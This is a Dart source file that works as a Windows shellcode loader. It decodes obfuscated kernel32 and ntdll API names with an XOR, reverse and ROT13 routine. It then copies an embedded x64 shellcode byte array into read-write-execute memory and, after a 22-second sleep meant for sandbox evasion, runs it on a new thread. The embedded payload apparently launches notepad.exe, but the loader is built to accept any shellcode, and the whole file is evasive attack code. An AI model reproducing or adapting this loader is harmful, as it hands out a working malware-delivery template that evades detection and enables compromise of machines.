import 'dart:io';
import 'dart:convert';
import 'dart:ffi';
import 'dart:typed_data';
import 'package:ffi/ffi.dart';

var data = [
  0xfc,
  0x48,
  0x83,
  0xe4,
  0xf0,
  0xe8,
  0xc0,
  0x00,
  0x00,
  0x00,
  0x41,
  0x51,
  0x41,
  0x50,
  0x52,
  0x51,
  0x56,
  0x48,
  0x31,
  0xd2,
  0x65,
  0x48,
  0x8b,
  0x52,
  0x60,
  0x48,
  0x8b,
  0x52,
  0x18,
  0x48,
  0x8b,
  0x52,
  0x20,
  0x48,
  0x8b,
  0x72,
  0x50,
  0x48,
  0x0f,
  0xb7,
  0x4a,
  0x4a,
  0x4d,
  0x31,
  0xc9,
  0x48,
  0x31,
  0xc0,
  0xac,
  0x3c,
  0x61,
  0x7c,
  0x02,
  0x2c,
  0x20,
  0x41,
  0xc1,
  0xc9,
  0x0d,
  0x41,
  0x01,
  0xc1,
  0xe2,
  0xed,
  0x52,
  0x41,
  0x51,
  0x48,
  0x8b,
  0x52,
  0x20,
  0x8b,
  0x42,
  0x3c,
  0x48,
  0x01,
  0xd0,
  0x8b,
  0x80,
  0x88,
  0x00,
  0x00,
  0x00,
  0x48,
  0x85,
  0xc0,
  0x74,
  0x67,
  0x48,
  0x01,
  0xd0,
  0x50,
  0x8b,
  0x48,
  0x18,
  0x44,
  0x8b,
  0x40,
  0x20,
  0x49,
  0x01,
  0xd0,
  0xe3,
  0x56,
  0x48,
  0xff,
  0xc9,
  0x41,
  0x8b,
  0x34,
  0x88,
  0x48,
  0x01,
  0xd6,
  0x4d,
  0x31,
  0xc9,
  0x48,
  0x31,
  0xc0,
  0xac,
  0x41,
  0xc1,
  0xc9,
  0x0d,
  0x41,
  0x01,
  0xc1,
  0x38,
  0xe0,
  0x75,
  0xf1,
  0x4c,
  0x03,
  0x4c,
  0x24,
  0x08,
  0x45,
  0x39,
  0xd1,
  0x75,
  0xd8,
  0x58,
  0x44,
  0x8b,
  0x40,
  0x24,
  0x49,
  0x01,
  0xd0,
  0x66,
  0x41,
  0x8b,
  0x0c,
  0x48,
  0x44,
  0x8b,
  0x40,
  0x1c,
  0x49,
  0x01,
  0xd0,
  0x41,
  0x8b,
  0x04,
  0x88,
  0x48,
  0x01,
  0xd0,
  0x41,
  0x58,
  0x41,
  0x58,
  0x5e,
  0x59,
  0x5a,
  0x41,
  0x58,
  0x41,
  0x59,
  0x41,
  0x5a,
  0x48,
  0x83,
  0xec,
  0x20,
  0x41,
  0x52,
  0xff,
  0xe0,
  0x58,
  0x41,
  0x59,
  0x5a,
  0x48,
  0x8b,
  0x12,
  0xe9,
  0x57,
  0xff,
  0xff,
  0xff,
  0x5d,
  0x48,
  0xba,
  0x01,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x00,
  0x48,
  0x8d,
  0x8d,
  0x01,
  0x01,
  0x00,
  0x00,
  0x41,
  0xba,
  0x31,
  0x8b,
  0x6f,
  0x87,
  0xff,
  0xd5,
  0xbb,
  0xf0,
  0xb5,
  0xa2,
  0x56,
  0x41,
  0xba,
  0xa6,
  0x95,
  0xbd,
  0x9d,
  0xff,
  0xd5,
  0x48,
  0x83,
  0xc4,
  0x28,
  0x3c,
  0x06,
  0x7c,
  0x0a,
  0x80,
  0xfb,
  0xe0,
  0x75,
  0x05,
  0xbb,
  0x47,
  0x13,
  0x72,
  0x6f,
  0x6a,
  0x00,
  0x59,
  0x41,
  0x89,
  0xda,
  0xff,
  0xd5,
  0x6e,
  0x6f,
  0x74,
  0x65,
  0x70,
  0x61,
  0x64,
  0x2e,
  0x65,
  0x78,
  0x65,
  0x00
];

String decrypt(String encrypted, String key) {
  List<int> bytes = base64Decode(encrypted);
  String reversed = '';
  for (int i = 0; i < bytes.length; i++) {
    int c = bytes[i] ^ key.codeUnitAt(i % key.length);
    reversed += String.fromCharCode(c);
  }

  String rot13 = String.fromCharCodes(reversed.runes.toList().reversed);

  String message = '';
  for (int i = 0; i < rot13.length; i++) {
    int c = rot13.codeUnitAt(i);
    if ((c >= 65 && c <= 77) || (c >= 97 && c <= 109)) {
      c += 13;
    } else if ((c >= 78 && c <= 90) || (c >= 110 && c <= 122)) {
      c -= 13;
    }
    message += String.fromCharCode(c);
  }

  return message;
}

Pointer<Uint8> ss = calloc(data.length);

final MEM_COMMIT = 0x00001000;
final MEM_RESERVE = 0x00002000;
final PAGE_EXECUTE_READWRITE = 0x40;
final _kernel32 =
    DynamicLibrary.open(decrypt("DTwiTEMCCAtXDAY9", "tESbq1qy6i"));
final _ntdll = DynamicLibrary.open(decrypt("DTwiTAhIAB5X", "tESbq1qy6i"));

typedef PTHREAD_START_ROUTINE = Uint32 Function(Pointer<NativeType>);
typedef LPTHREAD_START_ROUTINE = Pointer<NativeFunction<PTHREAD_START_ROUTINE>>;

class SECURITY_ATTRIBUTES extends Struct {
  @Uint32()
  external int nLength;
  external Pointer lpSecurityDescriptor;
  @Int32()
  external int bInheritHandle;
}

Pointer VirtualAlloc(
    Pointer<Void> lpAddress, int dwSize, int flAllocationType, int flProtect) {
  final _VirtualAlloc = _kernel32.lookupFunction<
      Pointer<Void> Function(Pointer<Void> lpAddress, IntPtr dwSize,
          Uint32 flAllocationType, Uint32 flProtect),
      Pointer<Void> Function(
          Pointer<Void> lpAddress,
          int dwSize,
          int flAllocationType,
          int flProtect)>(decrypt("BCcqGz9IHxFRDAIM", "tESbq1qy6i"));
  return _VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

void RtlMoveMemory(
    Pointer<Uint8> Destination, Pointer<Uint8> Source, int Length) {
  final _RtlMoveMemory = _ntdll.lookupFunction<
      Void Function(
          Pointer<Uint8> Destination, Pointer<Uint8> Source, Uint32 Length),
      void Function(Pointer<Uint8> Destination, Pointer<Uint8> Source,
          int Length)>(decrypt("GCAxGANrAxBUMw0iFg==", "tESbq1qy6i"));
  return _RtlMoveMemory(Destination, Source, Length);
}

int CreateThread(
    Pointer<SECURITY_ATTRIBUTES> lpThreadAttributes,
    int dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    Pointer lpParameter,
    int dwCreationFlags,
    Pointer<Uint32> lpThreadId) {
  final _CreateThread = _kernel32.lookupFunction<
          IntPtr Function(
              Pointer<SECURITY_ATTRIBUTES> lpThreadAttributes,
              IntPtr dwStackSize,
              LPTHREAD_START_ROUTINE lpStartAddress,
              Pointer lpParameter,
              Uint32 dwCreationFlags,
              Pointer<Uint32> lpThreadId),
          int Function(
              Pointer<SECURITY_ATTRIBUTES> lpThreadAttributes,
              int dwStackSize,
              LPTHREAD_START_ROUTINE lpStartAddress,
              Pointer lpParameter,
              int dwCreationFlags,
              Pointer<Uint32> lpThreadId)>(
      decrypt("BSshBwR2Ax5YGxEV", "tESbq1qy6i"));
  return _CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress,
      lpParameter, dwCreationFlags, lpThreadId);
}

int WaitForSingleObject(int hHandle, int dwMilliseconds) {
  final _WaitForSingleObject = _kernel32.lookupFunction<
          Uint32 Function(IntPtr hHandle, Uint32 dwMilliseconds),
          int Function(int hHandle, int dwMilliseconds)>(
      decrypt('EzUhFR5zAwBCCAIDNgAiVgcXfA==', "tESbq1qy6i"));
  return _WaitForSingleObject(hHandle, dwMilliseconds);
}

void main(List<String> arguments) {
  print(decrypt("DTwiTEMCCAtXDAY9", "tESbq1qy6i"));
  for (var i = 0; i < data.length; i++) {
    ss.elementAt(i).value = data[i].toUnsigned(8);
  }

  var exec =
      VirtualAlloc(nullptr, data.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(exec.cast<Uint8>(), ss, data.length);
  LPTHREAD_START_ROUTINE ee = Pointer.fromAddress(exec.address);
  sleep(Duration(seconds: 22));
  var th = CreateThread(nullptr, 0, ee, nullptr, 0, nullptr);
  WaitForSingleObject(th, -1);
}
